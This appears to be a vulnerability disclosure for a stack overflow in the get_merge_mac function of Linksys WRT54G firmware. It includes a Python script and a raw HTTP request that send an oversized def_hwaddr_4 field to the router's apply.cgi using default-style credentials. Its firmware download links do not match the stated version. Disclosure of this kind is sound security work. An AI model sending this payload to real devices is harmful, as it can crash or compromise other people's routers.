
# Overview
Firmware download website: [https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5)
[https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8)

# Affected version
Linksys WRT54G Firmware v4.21.5
# Vulnerability details
The Linksys WRT54G Firmware v4.21.5 has a stack overflow vulnerability in get_merge_mac function. The variable `def_hwaddr_%d`receives the parameter from a POST request.  In line 17, the stract function will merge it with the variable a2. It is important to note that in the calling function, the a2 variable is stack-allocated and has a size of only 24 characters. If the variable exceeds this length, it can result in a buffer overflow vulnerability, potentially leading to remote code execution or denial-of-service attacks.  
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1720361910064-aa48cb25-1686-46a3-9ff8-7fec7e801ad9.png#averageHue=%23fcfcfc&clientId=uf4146c48-8275-4&from=paste&height=403&id=uaa708eeb&originHeight=634&originWidth=814&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=55947&status=done&style=none&taskId=u0c1d15e5-6868-4248-9df1-8a6e9827d8e&title=&width=516.825420296022)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1720361928738-ad12f34b-b239-473a-b43c-ab6aaf49c86b.png#averageHue=%23fbfbfb&clientId=uf4146c48-8275-4&from=paste&height=192&id=ufb9d0d40&originHeight=303&originWidth=907&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=29397&status=done&style=none&taskId=uacfbc9e5-0e1f-4b69-a55e-b77093276fe&title=&width=575.8730420251744)
# POC
```c
import requests

url = 'http://192.168.1.1/apply.cgi'
headers = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.1.1',
    'Authorization': 'Basic OmFkbWlu',
    'Connection': 'close',
    'Referer': 'http://192.168.1.1/WanMAC.asp',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1',
}

payload = ('submit_button=WanMAC&change_action=&submit_type=&action=Apply&mac_clone_enable=1&def_hwaddr=6&'
           'def_hwaddr_0=1C&def_hwaddr_1=0F&def_hwaddr_2=66&def_hwaddr_3=0A&'
           'def_hwaddr_4=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&'
           'def_hwaddr_5=E3')

response = requests.post(url, headers=headers, data=payload)

print('Status:', response.status_code)
print('Response:', response.text)

```
```c
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Origin: http://192.168.1.1
Authorization: Basic OmFkbWlu
Connection: close
Referer: http://192.168.1.1/WanMAC.asp
Upgrade-Insecure-Requests: 1
Priority: u=1

submit_button=WanMAC&change_action=&submit_type=&action=Apply&mac_clone_enable=1&def_hwaddr=6&def_hwaddr_0=1C&def_hwaddr_1=0F&def_hwaddr_2=66&def_hwaddr_3=0A&def_hwaddr_4=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&def_hwaddr_5=E3
```
